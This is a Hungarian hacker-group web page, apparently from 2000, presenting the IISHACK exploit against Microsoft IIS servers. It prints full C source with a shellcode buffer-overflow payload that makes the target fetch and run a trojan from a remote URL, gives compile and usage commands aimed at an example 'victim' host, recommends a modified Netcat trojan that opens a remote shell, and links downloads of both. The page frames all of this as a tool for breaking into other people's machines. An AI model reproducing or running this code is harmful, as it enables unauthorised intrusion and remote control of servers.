<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1250">
<title>Nestan </title>
<meta name="GENERATOR" content="Microsoft FrontPage 3.0">
</head>

<body>
<div align="center"><center>

<table border="0" width="100%" cellspacing="0" cellpadding="0">
  <tr>
    <td width="100%" bgcolor="#454545"><p align="center"><font face="Verdana" color="#FFFFFF"><strong><small>Nestan
    - IISHACK</small></strong></font></td>
  </tr>
</table>
</center></div><div align="center"><center>

<table border="1" width="100%" cellspacing="0" cellpadding="2">
  <tr>
    <td width="100%" bgcolor="#C4C4C4"><u><strong><font face="Verdana"><small>Bevezetõ</small></font></strong></u>
    <p><font face="Verdana"><small>Biztos vagyok benne hogy már sokan találkoztatok olyan
    oldallal, amin a fentebb említett webszerver pörgött ezerrel. Pontosabban nem is
    webszerver, mert tudtommal van FTP és Gopher része is. Éppen a napokban találtam egy
    windows alatt futtatható kicsi programot amivel egy exploitot kijátszva fel tudsz
    tölteni egy trojai programot. Itt szeretném megemlíteni, hogy van ugyebár linuxos .c
    forrása is, én ezt használom, úgyhogy a cikk fõleg erre fog épülni. </small></font></p>
    <p><u><strong><font face="Verdana"><small>A Linuxos C forrás</small></font></strong></u></p>
    <p><small><small><font face="Verdana">#include &lt;stdio.h&gt;<br>
    #include &lt;sys/types.h&gt;<br>
    #include &lt;sys/socket.h&gt;<br>
    #include &lt;netinet/in.h&gt;<br>
    #include &lt;netdb.h&gt;<br>
    #include &lt;stdlib.h&gt;<br>
    #include &lt;arpa/inet.h&gt;<br>
    <br>
    #define egglen 1157<br>
    #define urloff 1055<br>
    <br>
    unsigned char egg[] = {<br>
    71, 69, 84, 32, 47, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65,<br>
    65, 65, 65, 176, 135, 103, 104, 176, 135, 103, 104, 144, 144, 144, 144, 88,<br>
    88, 144, 51, 192, 80, 91, 83, 89, 139, 222, 102, 184, 33, 2, 3, 216,<br>
    50, 192, 215, 44, 33, 136, 3, 75, 60, 222, 117, 244, 67, 67, 186, 208,<br>
    16, 103, 104, 82, 81, 83, 255, 18, 139, 240, 139, 249, 252, 89, 177, 6,<br>
    144, 90, 67, 50, 192, 215, 80, 88, 132, 192, 80, 88, 117, 244, 67, 82,<br>
    81, 83, 86, 178, 84, 255, 18, 171, 89, 90, 226, 230, 67, 50, 192, 215,<br>
    80, 88, 132, 192, 80, 88, 117, 244, 67, 82, 83, 255, 18, 139, 240, 90,<br>
    51, 201, 80, 88, 177, 5, 67, 50, 192, 215, 80, 88, 132, 192, 80, 88,<br>
    117, 244, 67, 82, 81, 83, 86, 178, 84, 255, 18, 171, 89, 90, 226, 230,<br>
    51, 192, 80, 64, 80, 64, 80, 255, 87, 244, 137, 71, 204, 51, 192, 80,<br>
    80, 176, 2, 102, 171, 88, 180, 80, 102, 171, 88, 171, 171, 171, 177, 33,<br>
    144, 102, 131, 195, 22, 139, 243, 67, 50, 192, 215, 58, 200, 117, 248, 50,<br>
    192, 136, 3, 86, 255, 87, 236, 144, 102, 131, 239, 16, 146, 139, 82, 12,<br>
    139, 18, 139, 18, 146, 139, 215, 137, 66, 4, 82, 106, 16, 82, 255, 119,<br>
    204, 255, 87, 248, 90, 102, 131, 238, 8, 86, 67, 139, 243, 252, 172, 132,<br>
    192, 117, 251, 65, 78, 199, 6, 141, 138, 141, 138, 129, 54, 128, 128, 128,<br>
    128, 51, 192, 80, 80, 106, 72, 83, 255, 119, 204, 255, 87, 240, 88, 91,<br>
    139, 208, 102, 184, 255, 15, 80, 82, 80, 82, 255, 87, 232, 139, 240, 88,<br>
    144, 144, 144, 144, 80, 83, 255, 87, 212, 139, 232, 51, 192, 90, 82, 80,<br>
    82, 86, 255, 119, 204, 255, 87, 236, 128, 252, 255, 116, 15, 80, 86, 85,<br>
    255, 87, 216, 128, 252, 255, 116, 4, 133, 192, 117, 223, 85, 255, 87, 220,<br>
    51, 192, 64, 80, 83, 255, 87, 228, 144, 144, 144, 144, 255, 108, 102, 115,<br>
    111, 102, 109, 84, 83, 33, 128, 141, 132, 147, 134, 130, 149, 33, 128, 141,<br>
    152, 147, 138, 149, 134, 33, 128, 141, 132, 141, 144, 148, 134, 33, 128, 141,<br>
    144, 145, 134, 143, 33, 120, 138, 143, 102, 153, 134, 132, 33, 104, 141, 144,<br>
    131, 130, 141, 98, 141, 141, 144, 132, 33, 120, 116, 112, 100, 108, 84, 83,<br>
    33, 147, 134, 132, 151, 33, 148, 134, 143, 133, 33, 148, 144, 132, 140, 134,<br>
    149, 33, 132, 144, 143, 143, 134, 132, 149, 33, 136, 134, 149, 137, 144, 148,<br>
    149, 131, 154, 143, 130, 142, 134, 33, 144, 152, 143, 79, 134, 153, 134, 33,<br>
    33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33,<br>
    33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33,<br>
    33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33,<br>
    33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33,<br>
    33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33,<br>
    33, 33, 33, 33, 33, 46, 104, 116, 114, 32, 72, 84, 84, 80, 47, 49,<br>
    46, 48, 13, 10, 13, 10, 10 };<br>
    <br>
    u_int32_t resolve(char *host)<br>
    {<br>
    struct hostent *he;<br>
    long n = inet_addr(host);<br>
    if(n!=-1)<br>
    return(n);<br>
    he = gethostbyname(host);<br>
    if(!he)<br>
    {<br>
    herror(&quot;gethostbyname&quot;);<br>
    return(0);<br>
    }<br>
    memcpy(&amp;n, he-&gt;h_addr, 4);<br>
    return(*(long *)he-&gt;h_addr_list[0]);<br>
    }<br>
    <br>
    int main(int argc, char **argv)<br>
    {<br>
    char *server;<br>
    int port;<br>
    char *url;<br>
    int fd;<br>
    struct sockaddr_in s_in;<br>
    int i=0,x,j=0;<br>
    int first=0;<br>
    if(argc != 4)<br>
    {<br>
    fprintf(stderr, &quot;usage: %s &lt;server&gt; &lt;port&gt; &lt;trojan&gt;\n&quot;,
    argv[0]);<br>
    exit(1);<br>
    }<br>
    server = argv[1];<br>
    port = atoi(argv[2]);<br>
    url = argv[3];<br>
    if(strlen(url) &gt; 85)<br>
    {<br>
    fprintf(stderr, &quot;Trojan name must be less than 85 characters.\n&quot;);<br>
    exit(1);<br>
    }<br>
    for(x=0;x&lt;strlen(url);x++)<br>
    {<br>
    if(url[x] == '/' &amp;&amp; !first)<br>
    {<br>
    first=1;<br>
    egg[urloff+j]='!'+0x21;<br>
    egg[urloff+j+1]='G'+0x21;<br>
    egg[urloff+j+2]='E'+0x21;<br>
    egg[urloff+j+3]='T'+0x21;<br>
    egg[urloff+j+4]=' '+0x21;<br>
    egg[urloff+j+5]='/'+0x21;<br>
    j+=6;<br>
    continue;<br>
    }<br>
    egg[urloff+j] += url[x];<br>
    j++;<br>
    }<br>
    fd = socket(AF_INET, SOCK_STREAM, 0);<br>
    s_in.sin_family = AF_INET;<br>
    s_in.sin_port = htons(port);<br>
    s_in.sin_addr.s_addr = resolve(server);<br>
    connect(fd, (struct sockaddr *)&amp;s_in, sizeof(struct sockaddr_in));<br>
    while(i!=egglen)<br>
    {<br>
    x=send(fd, egg+i, egglen-i, 0);<br>
    if(x&lt;0)<br>
    {<br>
    fprintf(stderr, &quot;Connection to target lost. WTF?\n&quot;);<br>
    exit(1);<br>
    }<br>
    i+=x;<br>
    }<br>
    printf(&quot;Trojan uploaded successfully (I think...)\n&quot;);<br>
    return(0);<br>
    }<br>
    /* EuroHack Team [2000] http://hackers.hungary.nu */</font></small></small></p>
    <p><u><strong><small><font face="Verdana">Használati útmutató</font></small></strong></u></p>
    <p><small><font face="Verdana">A programnak, mint ahogy azt már fentebb említettem, van
    linuxos és windowsos változata is. A linuxos egy .c forrás, amit feljebb láthattatok,
    a dosos pedig egy .asm forrás. A linuxost &quot;<em>cc -o iishack iishack.c</em>&quot;
    parancsal fordíthatjátok le, a windowsost pedig a &quot;<em>tasm32 -ml iishack.asm</em>
    majd a <em>tlink32 -Tpe -c -x iishack.obj ,,, import32</em>&quot; parancsok
    segítségével. Ha ez megtörtént akkor az alábbi módon tudsz exploitokat feltölteni
    a az áldozat gépére:</font></small></p>
    <p><small><font face="Verdana">./iishack &lt;server&gt; &lt;port&gt; &lt;trojai&gt;</font></small></p>
    <p><em><small><font face="Verdana">Például:</font></small></em></p>
    <p><small><font face="Verdana">./iishack www.aldozathostja.hu 80
    www.encimemaholatrojaivan.com/exploit.exe</font></small></p>
    <p><u><strong><small><font face="Verdana">Ajánlat</font></small></strong></u></p>
    <p><small><font face="Verdana">Az ajánlott trojai progi a mûvelet végrehajtásához az
    NCX.EXE vagy az NCX99.EXE legyen. Ez a Netcat hackelt változata... Miután az iishack egy
    verem túlcsordulás után feljuttatta és elindította, a progi az iishack-nél
    beállított portot megnyitja és egy shellhez juttat a szerveren.</font></small></p>
    <p align="left"><u><strong><font face="Verdana"><small>Ötlet:</small></font></strong></u></p>
    <p align="left"><small><font face="Verdana"><a href="http://ww.eEye.Com/">http://ww.eEye.Com/</a>
    </font></small></p>
    <p align="left"><u><strong><small><font face="Verdana">Letölthetõ források, programok:</font></small></strong></u></p>
    <p align="left"><small><font face="Verdana">- <a
    href="http://eurohack.zona.hu/cikkek/web/ncx.exe">NCX.EXE</a></font></small><br>
    <small><font face="Verdana">- <a href="http://eurohack.zona.hu/cikkek/web/ncx99.exe">NCX99.EXE</a></font></small><br>
    <small><font face="Verdana">- <a href="http://eurohack.zona.hu/cikkek/web/iishack.c">IISHACK.C</a></font></small><br>
    <small><font face="Verdana">- <a href="http://eurohack.zona.hu/cikkek/web/iishack.asm">IISHACK.ASM</a></font></small></td>
  </tr>
</table>
</center></div><div align="center"><center>

<table border="0" width="100%" cellspacing="0" cellpadding="0">
  <tr>
    <td width="100%" bgcolor="#454545" height="10"><small><strong><font face="Verdana"
    color="#000000"><p align="center"></font><font face="Verdana" color="#FFFFFF">©2000.
    Fearless Criminal Force.</font></strong></small></td>
  </tr>
</table>
</center></div>
</body>
</html>
